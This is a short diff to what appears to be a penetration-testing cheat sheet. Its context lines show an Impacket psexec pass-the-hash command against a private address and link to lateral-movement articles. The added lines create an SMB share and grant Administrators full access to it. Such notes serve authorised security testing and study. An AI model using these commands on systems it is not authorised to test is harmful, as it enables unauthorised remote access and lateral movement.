@@ -57,3 +57,9 @@ See Impacket Section: ./psexec.py Administrator@192.168.10.17 -hashes "HASH:HASH
 [URL] https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
 [URL] https://eaneatfruit.github.io/2019/08/18/Offensive-Lateral-Movement/
 ```
+
+## Create and publish writable share (wont work SMB3)
+```
+net share mysharedfolder=c:\users\user-01\shared
+Grant-SmbShareAccess -Name mysharedfolder -AccountName Administrators -AccessRight Full -Force
+```
